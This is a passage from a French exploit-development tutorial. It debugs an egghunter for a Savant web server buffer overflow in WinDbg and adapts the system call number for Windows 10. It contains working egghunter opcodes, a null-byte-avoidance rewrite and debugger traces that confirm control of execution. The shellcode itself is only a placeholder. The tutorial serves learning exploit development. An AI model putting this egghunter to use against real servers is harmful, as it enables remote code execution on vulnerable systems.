<a id="__codelineno-52-10" name="__codelineno-52-10" href="#__codelineno-52-10"></a><span class="n">0460eaa0</span> <span class="n">90</span>              <span class="n">nop</span>
<a id="__codelineno-52-11" name="__codelineno-52-11" href="#__codelineno-52-11"></a><span class="n">0460eaa1</span> <span class="n">90</span>              <span class="n">nop</span>
<a id="__codelineno-52-12" name="__codelineno-52-12" href="#__codelineno-52-12"></a><span class="n">0460eaa2</span> <span class="n">90</span>              <span class="n">nop</span>
<a id="__codelineno-52-13" name="__codelineno-52-13" href="#__codelineno-52-13"></a><span class="n">0460eaa3</span> <span class="n">90</span>              <span class="n">nop</span>
<a id="__codelineno-52-14" name="__codelineno-52-14" href="#__codelineno-52-14"></a><span class="n">0460eaa4</span> <span class="n">90</span>              <span class="n">nop</span>
<a id="__codelineno-52-15" name="__codelineno-52-15" href="#__codelineno-52-15"></a><span class="n">0460eaa5</span> <span class="n">6681caff0f</span>      <span class="n">or</span>      <span class="n">dx</span><span class="p">,</span><span class="n">0FFFh</span>
<a id="__codelineno-52-16" name="__codelineno-52-16" href="#__codelineno-52-16"></a><span class="n">0460eaaa</span> <span class="n">42</span>              <span class="n">inc</span>     <span class="n">edx</span>
<a id="__codelineno-52-17" name="__codelineno-52-17" href="#__codelineno-52-17"></a><span class="n">0460eaab</span> <span class="n">52</span>              <span class="n">push</span>    <span class="n">edx</span>
<a id="__codelineno-52-18" name="__codelineno-52-18" href="#__codelineno-52-18"></a><span class="n">0460eaac</span> <span class="n">6a02</span>            <span class="n">push</span>    <span class="n">2</span>
<a id="__codelineno-52-19" name="__codelineno-52-19" href="#__codelineno-52-19"></a><span class="n">0460eaae</span> <span class="n">58</span>              <span class="n">pop</span>     <span class="n">eax</span>
<a id="__codelineno-52-20" name="__codelineno-52-20" href="#__codelineno-52-20"></a><span class="n">0460eaaf</span> <span class="n">cd2e</span>            <span class="n">int</span>     <span class="n">2Eh</span>
<a id="__codelineno-52-21" name="__codelineno-52-21" href="#__codelineno-52-21"></a><span class="n">0460eab1</span> <span class="n">3c05</span>            <span class="n">cmp</span>     <span class="n">al</span><span class="p">,</span><span class="n">5</span>
<a id="__codelineno-52-22" name="__codelineno-52-22" href="#__codelineno-52-22"></a><span class="n">0460eab3</span> <span class="n">5a</span>              <span class="n">pop</span>     <span class="n">edx</span>
<a id="__codelineno-52-23" name="__codelineno-52-23" href="#__codelineno-52-23"></a><span class="n">0460eab4</span> <span class="n">74ef</span>            <span class="n">je</span>      <span class="n">0460eaa5</span>
<a id="__codelineno-52-24" name="__codelineno-52-24" href="#__codelineno-52-24"></a><span class="n">0460eab6</span> <span class="n">b877303074</span>      <span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span><span class="n">offset</span> <span class="n">msvcp_win</span><span class="p">!</span><span class="n">_CTA2</span><span class="k">?</span><span class="n">AVbad_exceptionstd</span><span class="p">+</span><span class="n">0x13cab</span> <span class="p">(</span><span class="n">74303077</span><span class="p">)</span>
<a id="__codelineno-52-25" name="__codelineno-52-25" href="#__codelineno-52-25"></a><span class="n">0460eabb</span> <span class="n">89d7</span>            <span class="n">mov</span>     <span class="n">edi</span><span class="p">,</span><span class="n">edx</span>
<a id="__codelineno-52-26" name="__codelineno-52-26" href="#__codelineno-52-26"></a><span class="n">0460eabd</span> <span class="n">af</span>              <span class="n">scas</span>    <span class="n">dword</span> <span class="n">ptr</span> <span class="n">es</span><span class="p">:</span><span class="no">[edi]</span>
<a id="__codelineno-52-27" name="__codelineno-52-27" href="#__codelineno-52-27"></a><span class="n">0460eabe</span> <span class="n">75ea</span>            <span class="n">jne</span>     <span class="n">0460eaaa</span>
<a id="__codelineno-52-28" name="__codelineno-52-28" href="#__codelineno-52-28"></a><span class="n">0460eac0</span> <span class="n">af</span>              <span class="n">scas</span>    <span class="n">dword</span> <span class="n">ptr</span> <span class="n">es</span><span class="p">:</span><span class="no">[edi]</span>
<a id="__codelineno-52-29" name="__codelineno-52-29" href="#__codelineno-52-29"></a><span class="n">0460eac1</span> <span class="n">75e7</span>            <span class="n">jne</span>     <span class="n">0460eaaa</span>
<a id="__codelineno-52-30" name="__codelineno-52-30" href="#__codelineno-52-30"></a><span class="n">0460eac3</span> <span class="n">ffe7</span>            <span class="n">jmp</span>     <span class="n">edi</span>
<a id="__codelineno-52-31" name="__codelineno-52-31" href="#__codelineno-52-31"></a><span class="c">#</span>
<a id="__codelineno-52-32" name="__codelineno-52-32" href="#__codelineno-52-32"></a><span class="c"># On recherche notre egg pour confirmer qu&#39;il est bien en mémoire et on le trouve bien</span>
<a id="__codelineno-52-33" name="__codelineno-52-33" href="#__codelineno-52-33"></a><span class="n">0</span><span class="p">:</span><span class="n">004</span><span class="p">&gt;</span> <span class="n">s</span> <span class="n">-a</span> <span class="n">0x0</span> <span class="n">L</span><span class="k">?</span><span class="n">80000000</span> <span class="n">w00tw00t</span>
<a id="__codelineno-52-34" name="__codelineno-52-34" href="#__codelineno-52-34"></a><span class="n">018d5b2e</span>  <span class="n">77</span> <span class="n">30</span> <span class="n">30</span> <span class="n">74</span> <span class="n">77</span> <span class="n">30</span> <span class="n">30</span> <span class="n">74</span><span class="p">-</span><span class="n">44</span> <span class="n">44</span> <span class="n">44</span> <span class="n">44</span> <span class="n">44</span> <span class="n">44</span> <span class="n">44</span> <span class="n">44</span>  <span class="n">w00tw00tDDDDDDDD</span>
<a id="__codelineno-52-35" name="__codelineno-52-35" href="#__codelineno-52-35"></a><span class="c">#</span>
<a id="__codelineno-52-36" name="__codelineno-52-36" href="#__codelineno-52-36"></a><span class="c"># On met un point d&#39;arrêt sur l&#39;adresse ou le `jmp edi` est réalisé</span>
<a id="__codelineno-52-37" name="__codelineno-52-37" href="#__codelineno-52-37"></a><span class="n">0</span><span class="p">:</span><span class="n">004</span><span class="p">&gt;</span> <span class="n">bp</span> <span class="n">0460eac3</span>
<a id="__codelineno-52-38" name="__codelineno-52-38" href="#__codelineno-52-38"></a><span class="c">#</span>
<a id="__codelineno-52-39" name="__codelineno-52-39" href="#__codelineno-52-39"></a><span class="c"># On relance</span>
<a id="__codelineno-52-40" name="__codelineno-52-40" href="#__codelineno-52-40"></a><span class="n">0</span><span class="p">:</span><span class="n">004</span><span class="p">&gt;</span> <span class="n">g</span>
</code></pre></div>
<p>Le point d'arrêt n'est jamais atteint, Le <em>egghunter</em> tourne, mais ne trouve pas le <em>egg</em>. Pourtout on a bien confirmé qu'il est présent dans la mémoire via la recherche avec <code>s</code>.</p>
<p>Cet exploit fonctionne sur <code>Windows 7</code> mais pas <code>Windows 10</code>. Des changements entre les deux versions ont entrainé un dysfonctionnement du <em>egghunter</em>. Il est nécessaire de le modifier.</p>
<h4 id="corriger-lexploit">Corriger l'exploit</h4>
<p>On doit analyser notre preuve de concept pour comprendre pourquoi le egghunter ne fonctionne pas. Le point d'échec potentiel le plus important est l'appel à la fonction <code>NtAccessCheckAndAuditAlarm</code>.</p>
<p>Un des points négatifs de mettre le numéro de l'appel système au sein du code (ici <code>0x02</code>) est qu'il peut être amené à changer. Avant Windows 8 le numéro de l'appel système de <code>NtAccessCheckAndAuditAlarm</code> était <code>0x02</code>, ce n'est plus le cas ensuite. À partir de Windows 10, il change à chaque mise à jour.</p>
<p>On identifie le nouveau numéro d'appel système qui est <code>1C6h</code>.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a><span class="n">ntdll</span><span class="p">!</span><span class="n">NtAccessCheckAndAuditAlarm</span><span class="p">:</span>
<a id="__codelineno-53-2" name="__codelineno-53-2" href="#__codelineno-53-2"></a><span class="n">77840ec0</span> <span class="n">b8c6010000</span>      <span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span><span class="n">1C6h</span>                                               <span class="c"># ICI</span>
<a id="__codelineno-53-3" name="__codelineno-53-3" href="#__codelineno-53-3"></a><span class="n">77840ec5</span> <span class="n">e803000000</span>      <span class="n">call</span>    <span class="n">ntdll</span><span class="p">!</span><span class="n">NtAccessCheckAndAuditAlarm</span><span class="p">+</span><span class="n">0xd</span> <span class="p">(</span><span class="n">77840ecd</span><span class="p">)</span>
<a id="__codelineno-53-4" name="__codelineno-53-4" href="#__codelineno-53-4"></a><span class="n">77840eca</span> <span class="n">c22c00</span>          <span class="n">ret</span>     <span class="n">2Ch</span>
<a id="__codelineno-53-5" name="__codelineno-53-5" href="#__codelineno-53-5"></a><span class="n">77840ecd</span> <span class="n">8bd4</span>            <span class="n">mov</span>     <span class="n">edx</span><span class="p">,</span><span class="n">esp</span>
</code></pre></div>
<p>On met à jour notre script <code>Python</code> pour générer les <em>opcodes</em> du <em>egghunter</em> :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a><span class="c1">#</span>
<a id="__codelineno-54-2" name="__codelineno-54-2" href="#__codelineno-54-2"></a><span class="s2">&quot;  push 0x1c6    ;&quot;</span> 
<a id="__codelineno-54-3" name="__codelineno-54-3" href="#__codelineno-54-3"></a><span class="c1">#</span>
<a id="__codelineno-54-4" name="__codelineno-54-4" href="#__codelineno-54-4"></a><span class="s2">&quot;  pop eax    ;&quot;</span> 
<a id="__codelineno-54-5" name="__codelineno-54-5" href="#__codelineno-54-5"></a><span class="c1">#</span>
<a id="__codelineno-54-6" name="__codelineno-54-6" href="#__codelineno-54-6"></a><span class="s2">&quot;  int 0x2e   ;&quot;</span>
</code></pre></div>
<p>Génération des <em>opcodes</em> à la suite de la mise à jour du numéro d'appel système :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a><span class="p">$</span> <span class="n">python3</span> <span class="n">egghunter</span><span class="p">.</span><span class="n">py</span>             
<a id="__codelineno-55-2" name="__codelineno-55-2" href="#__codelineno-55-2"></a><span class="n">egghunter</span> <span class="p">=</span> <span class="p">(</span><span class="s2">&quot;\x66\x81\xca\xff\x0f\x42\x52\x68\xc6\x01\x00\x00\x58\xcd\x2e\x3c\x05\x5a\x74\xec\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75\xe7\xaf\x75\xe4\xff\xe7&quot;</span><span class="p">)</span>
</code></pre></div>
<p>On obtient des <em>null bytes</em> : <code>\x00\x00\</code> en passant de <code>push 0x2</code> a <code>push 0x1c6</code>. Problématique, car les <em>null bytes</em> sont des mauvais caractères.</p>
<p>On va utiliser l'instruction <code>NEC</code> qui est l'equivalent d'une soustraction sur <code>0</code>. On doit trouver un nombre qui soustrait a <code>0</code> va donner <code>1c6</code>.</p>
<p>On fait les opérations dans WinDBG :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a><span class="n">0</span><span class="p">:</span><span class="n">004</span><span class="p">&gt;</span> <span class="p">?</span> <span class="n">0x00</span> <span class="p">-</span> <span class="n">0x1C6</span>
<a id="__codelineno-56-2" name="__codelineno-56-2" href="#__codelineno-56-2"></a><span class="n">Evaluate</span> <span class="n">expression</span><span class="p">:</span> <span class="p">-</span><span class="n">454</span> <span class="p">=</span> <span class="n">fffffe3a</span>
<a id="__codelineno-56-3" name="__codelineno-56-3" href="#__codelineno-56-3"></a><span class="n">0</span><span class="p">:</span><span class="n">004</span><span class="p">&gt;</span> <span class="p">?</span> <span class="n">0x00</span> <span class="p">-</span> <span class="n">0xfffffe3a</span>
<a id="__codelineno-56-4" name="__codelineno-56-4" href="#__codelineno-56-4"></a><span class="n">Evaluate</span> <span class="n">expression</span><span class="p">:</span> <span class="p">-</span><span class="n">4294966842</span> <span class="p">=</span> <span class="n">ffffffff</span><span class="p">`</span><span class="n">000001c6</span>
</code></pre></div>
<p>On met à jour le code <code>Python</code> qui génère les <em>opcodes</em> du <em>egghunter</em> pour l'adapter</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a><span class="s2">&quot; loop_check:     &quot;</span>
<a id="__codelineno-57-2" name="__codelineno-57-2" href="#__codelineno-57-2"></a>  <span class="c1"># Save the edx register which holds our memory </span>
<a id="__codelineno-57-3" name="__codelineno-57-3" href="#__codelineno-57-3"></a>  <span class="c1"># address on the stack</span>
<a id="__codelineno-57-4" name="__codelineno-57-4" href="#__codelineno-57-4"></a><span class="s2">&quot;  push edx   ;&quot;</span>
<a id="__codelineno-57-5" name="__codelineno-57-5" href="#__codelineno-57-5"></a>  <span class="c1"># Push the negative number value of the system call number</span>
<a id="__codelineno-57-6" name="__codelineno-57-6" href="#__codelineno-57-6"></a><span class="s2">&quot;  mov eax 0xfffffe3a   ;&quot;</span> 
<a id="__codelineno-57-7" name="__codelineno-57-7" href="#__codelineno-57-7"></a>  <span class="c1"># Initialize the call to NtAccessCheckAndAuditAlarm</span>
<a id="__codelineno-57-8" name="__codelineno-57-8" href="#__codelineno-57-8"></a><span class="s2">&quot;  neg eax                              ;&quot;</span>
<a id="__codelineno-57-9" name="__codelineno-57-9" href="#__codelineno-57-9"></a>  <span class="c1"># Perform the system call</span>
<a id="__codelineno-57-10" name="__codelineno-57-10" href="#__codelineno-57-10"></a><span class="s2">&quot;  int 0x2e   ;&quot;</span> 
</code></pre></div>
<p>On génère de nouveau les <em>opcodes</em> suite a la mis à jour :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a><span class="err">$</span> <span class="n">python3</span> <span class="n">egghunter_v2</span><span class="o">.</span><span class="n">py</span>
<a id="__codelineno-58-2" name="__codelineno-58-2" href="#__codelineno-58-2"></a><span class="n">egghunter</span> <span class="o">=</span> <span class="p">(</span><span class="s2">&quot;</span><span class="se">\x66\x81\xca\xff\x0f\x42\x52\xb8\x3a\xfe\xff\xff\xf7\xd8\xcd\x2e\x3c\x05\x5a\x74\xeb\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75\xe6\xaf\x75\xe3\xff\xe7</span><span class="s2">&quot;</span><span class="p">)</span>
</code></pre></div>
<p>On positionne un point d'arrêt sur l'adresse ou se trouve l'instruction <code>POP EAX;RET</code> :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a><span class="n">0</span><span class="p">:</span><span class="n">010</span><span class="p">&gt;</span> <span class="n">bp</span> <span class="n">0x418674</span>
<a id="__codelineno-59-2" name="__codelineno-59-2" href="#__codelineno-59-2"></a><span class="p">***</span> <span class="n">WARNING</span><span class="p">:</span> <span class="n">Unable</span> <span class="n">to</span> <span class="n">verify</span> <span class="n">checksum</span> <span class="k">for</span> <span class="n">C</span><span class="p">:\</span><span class="n">Savant</span><span class="p">\</span><span class="n">Savant</span><span class="p">.</span><span class="n">exe</span>
<a id="__codelineno-59-3" name="__codelineno-59-3" href="#__codelineno-59-3"></a><span class="c">#</span>
<a id="__codelineno-59-4" name="__codelineno-59-4" href="#__codelineno-59-4"></a><span class="c">#</span>
<a id="__codelineno-59-5" name="__codelineno-59-5" href="#__codelineno-59-5"></a><span class="n">0</span><span class="p">:</span><span class="n">010</span><span class="p">&gt;</span> <span class="n">g</span>
<a id="__codelineno-59-6" name="__codelineno-59-6" href="#__codelineno-59-6"></a><span class="n">Breakpoint</span> <span class="n">0</span> <span class="n">hit</span>
<a id="__codelineno-59-7" name="__codelineno-59-7" href="#__codelineno-59-7"></a><span class="n">eax</span><span class="p">=</span><span class="n">00000000</span> <span class="n">ebx</span><span class="p">=</span><span class="n">018f5778</span> <span class="n">ecx</span><span class="p">=</span><span class="n">0000000e</span> <span class="n">edx</span><span class="p">=</span><span class="n">77841670</span> <span class="n">esi</span><span class="p">=</span><span class="n">018f5778</span> <span class="n">edi</span><span class="p">=</span><span class="n">0041703c</span>
<a id="__codelineno-59-8" name="__codelineno-59-8" href="#__codelineno-59-8"></a><span class="n">eip</span><span class="p">=</span><span class="n">00418674</span> <span class="n">esp</span><span class="p">=</span><span class="n">0477ea2c</span> <span class="n">ebp</span><span class="p">=</span><span class="n">41414141</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-59-9" name="__codelineno-59-9" href="#__codelineno-59-9"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00000206</span>
<a id="__codelineno-59-10" name="__codelineno-59-10" href="#__codelineno-59-10"></a><span class="n">Savant</span><span class="p">+</span><span class="n">0x18674</span><span class="p">:</span>
<a id="__codelineno-59-11" name="__codelineno-59-11" href="#__codelineno-59-11"></a><span class="n">00418674</span> <span class="n">58</span>              <span class="n">pop</span>     <span class="n">eax</span>
<a id="__codelineno-59-12" name="__codelineno-59-12" href="#__codelineno-59-12"></a><span class="c">#</span>
<a id="__codelineno-59-13" name="__codelineno-59-13" href="#__codelineno-59-13"></a><span class="c">#</span>
<a id="__codelineno-59-14" name="__codelineno-59-14" href="#__codelineno-59-14"></a><span class="n">0</span><span class="p">:</span><span class="n">005</span><span class="p">&gt;</span> <span class="n">ph</span>
<a id="__codelineno-59-15" name="__codelineno-59-15" href="#__codelineno-59-15"></a><span class="n">eax</span><span class="p">=</span><span class="n">0477fe70</span> <span class="n">ebx</span><span class="p">=</span><span class="n">018f5778</span> <span class="n">ecx</span><span class="p">=</span><span class="n">0000000e</span> <span class="n">edx</span><span class="p">=</span><span class="n">77841670</span> <span class="n">esi</span><span class="p">=</span><span class="n">018f5778</span> <span class="n">edi</span><span class="p">=</span><span class="n">0041703c</span>
<a id="__codelineno-59-16" name="__codelineno-59-16" href="#__codelineno-59-16"></a><span class="n">eip</span><span class="p">=</span><span class="n">00418675</span> <span class="n">esp</span><span class="p">=</span><span class="n">0477ea30</span> <span class="n">ebp</span><span class="p">=</span><span class="n">41414141</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-59-17" name="__codelineno-59-17" href="#__codelineno-59-17"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00000206</span>
<a id="__codelineno-59-18" name="__codelineno-59-18" href="#__codelineno-59-18"></a><span class="n">Savant</span><span class="p">+</span><span class="n">0x18675</span><span class="p">:</span>
<a id="__codelineno-59-19" name="__codelineno-59-19" href="#__codelineno-59-19"></a><span class="n">00418675</span> <span class="n">c3</span>              <span class="n">ret</span>
<a id="__codelineno-59-20" name="__codelineno-59-20" href="#__codelineno-59-20"></a><span class="c">#</span>
<a id="__codelineno-59-21" name="__codelineno-59-21" href="#__codelineno-59-21"></a><span class="c">#</span>
<a id="__codelineno-59-22" name="__codelineno-59-22" href="#__codelineno-59-22"></a><span class="n">0</span><span class="p">:</span><span class="n">005</span><span class="p">&gt;</span> <span class="n">ph</span>
<a id="__codelineno-59-23" name="__codelineno-59-23" href="#__codelineno-59-23"></a><span class="n">eax</span><span class="p">=</span><span class="n">0477fe70</span> <span class="n">ebx</span><span class="p">=</span><span class="n">018f5778</span> <span class="n">ecx</span><span class="p">=</span><span class="n">00000000</span> <span class="n">edx</span><span class="p">=</span><span class="n">77841670</span> <span class="n">esi</span><span class="p">=</span><span class="n">018f5778</span> <span class="n">edi</span><span class="p">=</span><span class="n">0041703c</span>
<a id="__codelineno-59-24" name="__codelineno-59-24" href="#__codelineno-59-24"></a><span class="n">eip</span><span class="p">=</span><span class="n">0477ea88</span> <span class="n">esp</span><span class="p">=</span><span class="n">0477ea34</span> <span class="n">ebp</span><span class="p">=</span><span class="n">41414141</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-59-25" name="__codelineno-59-25" href="#__codelineno-59-25"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00000246</span>
<a id="__codelineno-59-26" name="__codelineno-59-26" href="#__codelineno-59-26"></a><span class="n">0477ea88</span> <span class="n">0f8411000000</span>    <span class="n">je</span>      <span class="n">0477ea9f</span>                                <span class="p">[</span><span class="n">br</span><span class="p">=</span><span class="n">1</span><span class="p">]</span>
<a id="__codelineno-59-27" name="__codelineno-59-27" href="#__codelineno-59-27"></a><span class="c">#</span>
<a id="__codelineno-59-28" name="__codelineno-59-28" href="#__codelineno-59-28"></a><span class="c"># On décompile les opcodes a l&#39;adresse `0460ea9f`. On retrouve bien les NOP + le code ASM pour le egghunter</span>
<a id="__codelineno-59-29" name="__codelineno-59-29" href="#__codelineno-59-29"></a><span class="n">0</span><span class="p">:</span><span class="n">005</span><span class="p">&gt;</span> <span class="n">u</span> <span class="n">0477ea9f</span> <span class="n">L16</span>
<a id="__codelineno-59-30" name="__codelineno-59-30" href="#__codelineno-59-30"></a><span class="n">0477ea9f</span> <span class="n">90</span>              <span class="n">nop</span>
<a id="__codelineno-59-31" name="__codelineno-59-31" href="#__codelineno-59-31"></a><span class="n">0477eaa0</span> <span class="n">90</span>              <span class="n">nop</span>
<a id="__codelineno-59-32" name="__codelineno-59-32" href="#__codelineno-59-32"></a><span class="n">0477eaa1</span> <span class="n">90</span>              <span class="n">nop</span>
<a id="__codelineno-59-33" name="__codelineno-59-33" href="#__codelineno-59-33"></a><span class="n">0477eaa2</span> <span class="n">90</span>              <span class="n">nop</span>
<a id="__codelineno-59-34" name="__codelineno-59-34" href="#__codelineno-59-34"></a><span class="n">0477eaa3</span> <span class="n">90</span>              <span class="n">nop</span>
<a id="__codelineno-59-35" name="__codelineno-59-35" href="#__codelineno-59-35"></a><span class="n">0477eaa4</span> <span class="n">90</span>              <span class="n">nop</span>
<a id="__codelineno-59-36" name="__codelineno-59-36" href="#__codelineno-59-36"></a><span class="n">0477eaa5</span> <span class="n">6681caff0f</span>      <span class="n">or</span>      <span class="n">dx</span><span class="p">,</span><span class="n">0FFFh</span>
<a id="__codelineno-59-37" name="__codelineno-59-37" href="#__codelineno-59-37"></a><span class="n">0477eaaa</span> <span class="n">42</span>              <span class="n">inc</span>     <span class="n">edx</span>
<a id="__codelineno-59-38" name="__codelineno-59-38" href="#__codelineno-59-38"></a><span class="n">0477eaab</span> <span class="n">52</span>              <span class="n">push</span>    <span class="n">edx</span>
<a id="__codelineno-59-39" name="__codelineno-59-39" href="#__codelineno-59-39"></a><span class="n">0477eaac</span> <span class="n">b83afeffff</span>      <span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span><span class="n">0FFFFFE3Ah</span>
<a id="__codelineno-59-40" name="__codelineno-59-40" href="#__codelineno-59-40"></a><span class="n">0477eab1</span> <span class="n">f7d8</span>            <span class="n">neg</span>     <span class="n">eax</span>
<a id="__codelineno-59-41" name="__codelineno-59-41" href="#__codelineno-59-41"></a><span class="n">0477eab3</span> <span class="n">cd2e</span>            <span class="n">int</span>     <span class="n">2Eh</span>
<a id="__codelineno-59-42" name="__codelineno-59-42" href="#__codelineno-59-42"></a><span class="n">0477eab5</span> <span class="n">3c05</span>            <span class="n">cmp</span>     <span class="n">al</span><span class="p">,</span><span class="n">5</span>
<a id="__codelineno-59-43" name="__codelineno-59-43" href="#__codelineno-59-43"></a><span class="n">0477eab7</span> <span class="n">5a</span>              <span class="n">pop</span>     <span class="n">edx</span>
<a id="__codelineno-59-44" name="__codelineno-59-44" href="#__codelineno-59-44"></a><span class="n">0477eab8</span> <span class="n">74eb</span>            <span class="n">je</span>      <span class="n">0477eaa5</span>
<a id="__codelineno-59-45" name="__codelineno-59-45" href="#__codelineno-59-45"></a><span class="n">0477eaba</span> <span class="n">b877303074</span>      <span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span><span class="n">offset</span> <span class="n">msvcp_win</span><span class="p">!</span><span class="n">_CTA2</span><span class="k">?</span><span class="n">AVbad_exceptionstd</span><span class="p">+</span><span class="n">0x13cab</span> <span class="p">(</span><span class="n">74303077</span><span class="p">)</span>
<a id="__codelineno-59-46" name="__codelineno-59-46" href="#__codelineno-59-46"></a><span class="n">0477eabf</span> <span class="n">89d7</span>            <span class="n">mov</span>     <span class="n">edi</span><span class="p">,</span><span class="n">edx</span>
<a id="__codelineno-59-47" name="__codelineno-59-47" href="#__codelineno-59-47"></a><span class="n">0477eac1</span> <span class="n">af</span>              <span class="n">scas</span>    <span class="n">dword</span> <span class="n">ptr</span> <span class="n">es</span><span class="p">:</span><span class="no">[edi]</span>
<a id="__codelineno-59-48" name="__codelineno-59-48" href="#__codelineno-59-48"></a><span class="n">0477eac2</span> <span class="n">75e6</span>            <span class="n">jne</span>     <span class="n">0477eaaa</span>
<a id="__codelineno-59-49" name="__codelineno-59-49" href="#__codelineno-59-49"></a><span class="n">0477eac4</span> <span class="n">af</span>              <span class="n">scas</span>    <span class="n">dword</span> <span class="n">ptr</span> <span class="n">es</span><span class="p">:</span><span class="no">[edi]</span>
<a id="__codelineno-59-50" name="__codelineno-59-50" href="#__codelineno-59-50"></a><span class="n">0477eac5</span> <span class="n">75e3</span>            <span class="n">jne</span>     <span class="n">0477eaaa</span>
<a id="__codelineno-59-51" name="__codelineno-59-51" href="#__codelineno-59-51"></a><span class="n">0477eac7</span> <span class="n">ffe7</span>            <span class="n">jmp</span>     <span class="n">edi</span>
<a id="__codelineno-59-52" name="__codelineno-59-52" href="#__codelineno-59-52"></a><span class="c">#</span>
<a id="__codelineno-59-53" name="__codelineno-59-53" href="#__codelineno-59-53"></a><span class="c"># On met un point d&#39;arrêt sur l&#39;adresse ou le `jmp edi` est réalisé</span>
<a id="__codelineno-59-54" name="__codelineno-59-54" href="#__codelineno-59-54"></a><span class="n">0</span><span class="p">:</span><span class="n">005</span><span class="p">&gt;</span> <span class="n">bp</span> <span class="n">0477eac7</span>
<a id="__codelineno-59-55" name="__codelineno-59-55" href="#__codelineno-59-55"></a><span class="c">#</span>
<a id="__codelineno-59-56" name="__codelineno-59-56" href="#__codelineno-59-56"></a><span class="c">#</span>
<a id="__codelineno-59-57" name="__codelineno-59-57" href="#__codelineno-59-57"></a><span class="n">0</span><span class="p">:</span><span class="n">005</span><span class="p">&gt;</span> <span class="n">g</span>
</code></pre></div>
<p>Le second point d'arrêt est atteint. On est bien sur <code>jmp edi</code>. On affiche le contenu de <code>edi</code>, et on est bien sur le <em>egg</em> <code>w00tw00t</code> suivis du <em>shellcode</em> de <code>44444444</code> :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a><span class="n">Breakpoint</span> <span class="n">1</span> <span class="n">hit</span>
<a id="__codelineno-60-2" name="__codelineno-60-2" href="#__codelineno-60-2"></a><span class="n">eax</span><span class="p">=</span><span class="n">74303077</span> <span class="n">ebx</span><span class="p">=</span><span class="n">018f5778</span> <span class="n">ecx</span><span class="p">=</span><span class="n">0477ea30</span> <span class="n">edx</span><span class="p">=</span><span class="n">018f5b2e</span> <span class="n">esi</span><span class="p">=</span><span class="n">018f5778</span> <span class="n">edi</span><span class="p">=</span><span class="n">018f5b36</span>
<a id="__codelineno-60-3" name="__codelineno-60-3" href="#__codelineno-60-3"></a><span class="n">eip</span><span class="p">=</span><span class="n">0477eac7</span> <span class="n">esp</span><span class="p">=</span><span class="n">0477ea34</span> <span class="n">ebp</span><span class="p">=</span><span class="n">41414141</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-60-4" name="__codelineno-60-4" href="#__codelineno-60-4"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00000246</span>
<a id="__codelineno-60-5" name="__codelineno-60-5" href="#__codelineno-60-5"></a><span class="n">0477eac7</span> <span class="n">ffe7</span>            <span class="n">jmp</span>     <span class="n">edi</span> <span class="p">{</span><span class="n">018f5b36</span><span class="p">}</span>
